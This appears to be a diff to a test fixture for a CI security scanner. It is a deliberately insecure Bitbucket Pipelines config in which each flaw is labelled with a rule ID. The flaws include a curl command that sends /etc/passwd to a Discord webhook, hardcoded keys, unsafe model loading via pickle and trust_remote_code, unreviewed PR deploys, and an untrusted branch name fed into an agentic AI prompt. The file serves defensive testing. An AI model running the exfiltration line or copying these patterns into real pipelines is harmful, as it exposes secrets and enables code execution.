@@ -1,7 +1,7 @@
 # Realistic insecure Bitbucket Pipelines config exhibiting every BB-* failure.
 definitions:
   variables:
-    AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
+    AWS_ACCESS_KEY_ID: AKIAZ3MHALF2TESTHIJK
     DATABASE_PASSWORD: hunter2
 
 pipelines:
@@ -12,25 +12,30 @@ pipelines:
         script:
           - echo "Building $BITBUCKET_BRANCH"
           - npm test
-        # BB-010 — produces an artifact that the downstream deployment
-        # step consumes without verification.
         artifacts:
           - dist/**
+
+    # BB-035 — model loaded with trust_remote_code (executes the model
+    # repo's own Python at load time = code execution in the pipeline).
+    - step:
+        name: eval-model
+        script:
+          - python -c "from transformers import AutoModel; AutoModel.from_pretrained('acme/m', trust_remote_code=True)"
 
     # BB-004 — deploy step missing `deployment:` env gate.
     # BB-011 — inline long-lived AWS key in script.
     - step:
         name: Deploy to production
         script:
-          - export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+          - export AWS_ACCESS_KEY_ID=AKIAZ3MHALF2TESTHIJK
           - pipe: atlassian/aws-s3-deploy:1
             variables:
               AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID
               AWS_SECRET_ACCESS_KEY: $AWS_SECRET_ACCESS_KEY
               S3_BUCKET: 'example-bucket'
 
-    # BB-010 — separate deployment-marked step that consumes the
-    # earlier artifacts without verification.
+    # A deployment-marked promotion step (BB-010's untrusted-handover
+    # case lives in the pull-requests pipeline below).
     - step:
         name: Promote release
         deployment: staging
@@ -84,6 +89,53 @@ pipelines:
           # BB-025: evidence of malicious activity — Discord webhook
           # exfil of /etc/passwd.
           - 'curl -d "data=$(cat /etc/passwd)" https://discord.com/api/webhooks/1234567890/abcdefg'
+
+    # BB-032 — secret echoed to log.
+    - step:
+        script:
+          - echo "Key is $API_KEY"
+
+  # BB-010 — a pull-request build produces an artifact that a later
+  # deploy step consumes without verification (the untrusted-handover
+  # vector; the rule is scoped to pull-requests pipelines).
+  pull-requests:
+    "**":
+      - step:
+          name: PR build
+          script: [npm run build]
+          artifacts:
+            - dist/**
+      # BB-034 — a pull-request step deploys to a production environment,
+      # shipping the unreviewed PR branch straight to prod.
+      - step:
+          name: PR deploy
+          deployment: production
+          script:
+            - ./dist/install.sh
+            # BB-033 — IaC apply runs on the PR branch's Terraform.
+            - terraform apply -auto-approve
+      # BB-036 — untrusted PR branch name fed into an agentic AI CLI prompt.
+      - step:
+          name: AI triage
+          script:
+            - claude -p "Triage this pull request from branch $BITBUCKET_BRANCH"
+      # BB-037 — fetched artifact deserialized through pickle (RCE at load).
+      - step:
+          name: load model
+          script:
+            - curl -o model.bin https://example.com/model.bin
+            - python -c "import torch; torch.load('model.bin', weights_only=False)"
+      # BB-038 — model fetched from a registry with no pinned revision.
+      - step:
+          name: fetch model
+          script:
+            - huggingface-cli download vendor/llm
+      # BB-039 — agentic CLI output pushed straight to a branch (no review).
+      - step:
+          name: ai autoland
+          script:
+            - claude -p "Apply the fix and stage it"
+            - git push origin HEAD
 
 # BB-020 — full clone depth.
 clone:
